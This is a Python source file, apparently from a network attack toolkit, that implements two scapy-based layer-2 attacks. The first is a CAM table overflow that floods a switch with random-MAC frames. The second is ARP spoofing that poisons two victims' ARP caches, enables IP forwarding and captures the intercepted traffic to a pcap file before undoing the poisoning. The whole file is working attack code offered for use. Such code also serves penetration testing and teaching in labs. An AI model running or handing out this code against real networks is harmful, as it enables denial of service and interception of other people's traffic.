import os
import logging
from time import sleep

from scapy.layers.l2 import Ether, ARP, getmacbyip, Dot3
from scapy.volatile import RandMAC
from scapy.sendrecv import send, AsyncSniffer
from scapy.all import get_if_hwaddr
from bin.libs.aux_funcs import pcap_dump
from libs.aux_funcs import type_wrapper,attack_layer,attack_cat,attack_type, send_l2_loop, EXIT_SIGNAL



@type_wrapper(category = attack_cat.Attack, name = "CAM Overflow", type = attack_type.DoS, layer = attack_layer.L2, arg_list=[])
def cam_overflow(args):
    """Performs a CAM Overflow attack from the selected interface. Requires no additional arguments"""
    logging.debug("Starting CAM Overflow...")
    args['pkt'] = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC())
    send_l2_loop(args)
    logging.debug("Stopped CAM Overflow.")
    return args


@type_wrapper(category = attack_cat.Attack, name = "ARP Spoofing", type = attack_type.MitM, layer = attack_layer.L2, arg_list=["victim_1_IP","victim_2_IP"])
def arp_spoofing(args):
    """Performs an ARP Spoofing attack from the selected interface. Will poison ARP tables for the two selected hosts.
    Requires two arguments:
    arg             desc                    example value
    victim_1_IP     IP address for host 1   192.168.1.101
    victim_2_IP     IP address for host 2   192.168.1.102
    """

    iface = args["iface"]
    mac_1 = getmacbyip(args['victim_1_IP'])
    mac_2 = getmacbyip(args['victim_2_IP'])

    logging.debug("Starting ARP spoofing.\nEnabling IP forwarding and disabling ICMP redirects...")

    # Enable IP forwarding and disable ICMP redirects
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system(f"echo 0 > /proc/sys/net/ipv4/conf/{iface}/send_redirects")
    os.system("echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects")

    # Craft the ARP packets
    p1 = ARP(op=2, hwdst=mac_1, psrc=args["victim_2_IP"], pdst=args["victim_1_IP"])
    p2 = ARP(op=2, hwdst=mac_2, psrc=args["victim_1_IP"], pdst=args["victim_2_IP"])

    # Configure sniffer for MitM
    asniff = AsyncSniffer(lfilter = lambda x: \
        ((x.haslayer(Ether) and\
        (x[Ether].src == get_if_hwaddr(args['iface']) or\
         x[Ether].dst == get_if_hwaddr(args['iface']) ) or \
        (x.haslayer(Dot3) and \
        (x[Dot3].src == get_if_hwaddr(args['iface']) or\
         x[Dot3].dst == get_if_hwaddr(args['iface'])))) and\
        not x.haslayer(ARP)),\
        iface = args['iface'])

    asniff.start()


    # Send ARP packets in a loop
    logging.debug("Starting ARP loop...")
    while not EXIT_SIGNAL.is_set():
        send([p1,p2], iface=iface)
        sleep(5)
    
    logging.debug("Interrupt received, stopping ARP and restoring default settings...")

    asniff.stop()

    pcap_dump(asniff, "ARP_MITM")
    
    # Undo ARP poisoning
    p1 = Ether(dst = mac_1)/p1
    p1[ARP].hwsrc = mac_2
    p2 = Ether(dst = mac_2)/p2
    p2[ARP].hwsrc = mac_1

    send([p1, p2], iface = iface, count = 2)

    # Disable IP forwarding and enable ICMP redirects
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    os.system(f"echo 1 > /proc/sys/net/ipv4/conf/{iface}/send_redirects")
    os.system("echo 1 > /proc/sys/net/ipv4/conf/all/send_redirects")

    logging.debug("Stopped ARP Spoofing.")
    return args

